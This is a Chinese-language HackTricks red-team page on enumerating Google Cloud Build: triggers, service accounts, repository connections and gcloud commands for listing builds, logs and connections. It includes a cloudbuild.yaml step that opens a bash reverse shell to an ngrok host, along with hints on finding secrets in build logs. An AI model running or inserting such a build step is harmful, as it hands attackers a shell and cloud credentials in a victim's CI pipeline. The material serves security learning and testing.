# GCP - Cloud Build Enum

{% hint style="success" %}
学习和练习 AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
学习和练习 GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持 HackTricks</summary>

* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **通过提交 PR 分享黑客技巧到** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库。

</details>
{% endhint %}

## 基本信息

Google Cloud Build 是一个托管的 CI/CD 平台，**自动化软件构建**和发布过程，集成**源代码库**并支持多种编程语言。它**允许开发人员自动构建、测试和部署代码**，同时提供定制构建步骤和工作流的灵活性。

每个 Cloud Build Trigger **与 Cloud Repository 相关或直接连接到外部仓库**（Github、Bitbucket 和 Gitlab）。

{% hint style="success" %}
我没有看到任何方法可以从这里或 Cloud Repositories 窃取 Github/Bitbucket 令牌，因为当仓库被下载时，它是通过 [https://source.cloud.google.com/](https://source.cloud.google.com/) URL 访问的，Github 不会被客户端访问。
{% endhint %}

### 事件

Cloud Build 可以在以下情况下触发：

* **推送到分支**：指定分支
* **推送新标签**：指定标签
* **拉取请求**：指定接收 PR 的分支
* **手动调用**
* **Pub/Sub 消息**：指定主题
* **Webhook 事件**：将暴露一个 HTTPS URL，请求必须使用密钥进行身份验证

### 执行

有三种选项：

* 一个 yaml/json **指定要执行的命令**。通常是：`/cloudbuild.yaml`
* 只有一个可以在 web 控制台和 cli 中“内联”指定
* 最常见的选项
* 与未经身份验证的访问相关
* 一个 **Dockerfile** 来构建
* 一个 **Buildpack** 来构建

### SA 权限

**Service Account 具有 `cloud-platform` 范围**，因此它可以**使用所有权限**。如果**没有指定 SA**（例如在提交时），将使用**默认 SA** `<proj-number>@cloudbuild.gserviceaccount.com`。

默认情况下没有权限，但很容易给它一些权限：

<figure><img src="../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

### 审批

可以配置 Cloud Build **要求构建执行的审批**（默认禁用）。

### PR 审批

当触发器是 PR 时，因为**任何人都可以对公共仓库执行 PR**，仅**允许任何 PR 触发执行**是非常危险的。因此，默认情况下，执行将仅对所有者和协作者**自动**，为了执行其他用户 PR 的触发器，所有者或协作者必须评论 `/gcbrun`。

<figure><img src="../../../.gitbook/assets/image (150).png" alt="" width="563"><figcaption></figcaption></figure>

### 连接和仓库

可以创建以下连接：

* **GitHub:** 它将显示一个 OAuth 提示，要求权限以**获取 Github 令牌**，该令牌将存储在**Secret Manager**中。
* **GitHub Enterprise:** 它将要求安装一个 **GithubApp**。将从您的 GitHub Enterprise 主机创建一个**身份验证令牌**并存储在此项目中作为**Secret Manager**密钥。
* **GitLab / Enterprise:** 您需要**提供 API 访问令牌和 Read API 访问令牌**，这些令牌将存储在**Secret Manager**中。

一旦生成连接，您可以使用它**链接 Github 账户有访问权限的仓库**。

此选项可通过按钮使用：

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
请注意，通过此方法连接的仓库**仅在使用 2nd generation 的触发器中可用**。
{% endhint %}

### 连接一个仓库

这与**`connection`**不同。这允许**不同**方式获取**访问 Github 或 Bitbucket** 仓库的权限，但**不会生成连接对象，而是生成一个仓库对象（1st generation）。**

此选项可通过按钮使用：

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### 存储

有时 Cloud Build 会**生成一个新的存储来存储触发器的文件**。例如，在 GCP 提供的示例中会发生这种情况：
```bash
git clone https://github.com/GoogleCloudBuild/cloud-console-sample-build && \
cd cloud-console-sample-build && \
gcloud builds submit --config cloudbuild.yaml --region=global
```
一个名为 [security-devbox\_cloudbuild](https://console.cloud.google.com/storage/browser/security-devbox\_cloudbuild;tab=objects?forceOnBucketsSortingFiltering=false\&project=security-devbox) 的 Storage bucket 被创建来存储将要使用的 `.tgz` 文件。

### 获取 shell
```yaml
steps:
- name: bash
script: |
#!/usr/bin/env bash
bash -i >& /dev/tcp/5.tcp.eu.ngrok.io/12395 0>&1
options:
logging: CLOUD_LOGGING_ONLY
```
```markdown
Install gcloud inside cloud build:
```

在 cloud build 中安装 gcloud:
```bash
# https://stackoverflow.com/questions/28372328/how-to-install-the-google-cloud-sdk-in-a-docker-image
curl https://dl.google.com/dl/cloudsdk/release/google-cloud-sdk.tar.gz > /tmp/google-cloud-sdk.tar.gz
mkdir -p /usr/local/gcloud
tar -C /usr/local/gcloud -xvf /tmp/google-cloud-sdk.tar.gz
/usr/local/gcloud/google-cloud-sdk/install.sh
```
### 枚举

你可以在 **build 配置和日志中找到敏感信息**。
```bash
# Get configured triggers configurations
gcloud builds triggers list # Check for the words github and bitbucket
gcloud builds triggers describe <trigger-name>

# Get build executions
gcloud builds list
gcloud builds describe <build-uuid> # Get even the build yaml if defined in there
gcloud builds log <build-uuid> # Get build logs

# List all connections of each region
regions=("${(@f)$(gcloud compute regions list --format='value(name)')}")
for region in $regions; do
echo "Listing build connections in region: $region"
connections=("${(@f)$(gcloud builds connections list --region="$region" --format='value(name)')}")
if [[ ${#connections[@]} -eq 0 ]]; then
echo "No connections found in region $region."
else
for connection in $connections; do
echo "Describing connection $connection in region $region"
gcloud builds connections describe "$connection" --region="$region"
echo "-----------------------------------------"
done
fi
echo "========================================="
done

# List all worker-pools
regions=("${(@f)$(gcloud compute regions list --format='value(name)')}")
for region in $regions; do
echo "Listing build worker-pools in region: $region"
gcloud builds worker-pools list --region="$region"
echo "-----------------------------------------"
done
```
### 权限提升

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-cloudbuild-privesc.md" %}
[gcp-cloudbuild-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-cloudbuild-privesc.md)
{% endcontent-ref %}

### 未认证访问

{% content-ref url="../../gcp-security/gcp-unaunthenticated-enum-and-access/gcp-cloud-build-unauthenticated-enum.md" %}
[gcp-cloud-build-unauthenticated-enum.md](../../gcp-security/gcp-unaunthenticated-enum-and-access/gcp-cloud-build-unauthenticated-enum.md)
{% endcontent-ref %}

### 利用后操作

{% content-ref url="../../gcp-security/gcp-post-exploitation/gcp-cloud-build-post-exploitation.md" %}
[gcp-cloud-build-post-exploitation.md](../../gcp-security/gcp-post-exploitation/gcp-cloud-build-post-exploitation.md)
{% endcontent-ref %}

{% hint style="success" %}
学习和练习 AWS Hacking：<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
学习和练习 GCP Hacking：<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持 HackTricks</summary>

* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **通过提交 PR 分享黑客技巧到** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库。

</details>
{% endhint %}
